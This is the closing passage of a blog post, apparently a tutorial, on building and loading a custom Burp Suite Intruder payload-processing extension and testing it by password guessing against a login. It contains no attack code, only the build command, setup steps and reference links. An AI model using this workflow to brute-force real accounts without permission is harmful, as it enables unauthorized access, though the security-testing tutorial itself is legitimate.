+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gradle task fatJar
+</span></span><span class="line"><span class="cl">output: build/libs/IntruderPayloads-all.jar
+</span></span></code></pre></div><p>Add the extension under the <strong>Extender</strong> tab and verify it loads correctly:</p>
+<p><img loading="lazy"  src="Extender.png"
+        alt="Extender"/></p>
+<p>Select the extension we wrote under <strong>Payload Processing</strong>:</p>
+<p><img loading="lazy"  src="Processing.png"
+        alt="Processing"/></p>
+<p>To save time and make testing easier, I added several incorrect passwords and one correct password. You can see the successful result below:</p>
+<p><img loading="lazy"  src="result.png"
+        alt="result"/></p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://portswigger.net/burp/extender/api/"target="_blank" rel="noopener noreferrer">Burp Ext API</a></p>
+<p><a href="https://github.com/PortSwigger/example-intruder-payloads"target="_blank" rel="noopener noreferrer">Intruder payloads Sample</a></p>
+<p><a href="http://drops.wooyun.org/tools/14040"target="_blank" rel="noopener noreferrer">BurpSuite插件开发指南之 API</a></p>
+</article><section class="article labels"><a class="category" href=/en/categories/cybersecurity/>Cybersecurity</a><a class="tag" href=/en/tags/burp/>Burp</a><a class="tag" href=/en/tags/extender/>Extender</a><a class="tag" href=/en/tags/intruder/>Intruder</a></section>
+</div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/en/posts/ngrok-notes/"><span class="iconfont icon-article"></span>ngrok Notes</a></p><p><a class="link" href="/en/posts/build-openwrt-firmware-from-source-notes/"><span class="iconfont icon-article"></span>Building OpenWrt Firmware from Source</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
+        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
+            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
+            CC BY-NC-SA 4.0
+        </a>
+        (Attribution-NonCommercial-ShareAlike).
+    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>
+
+</html>
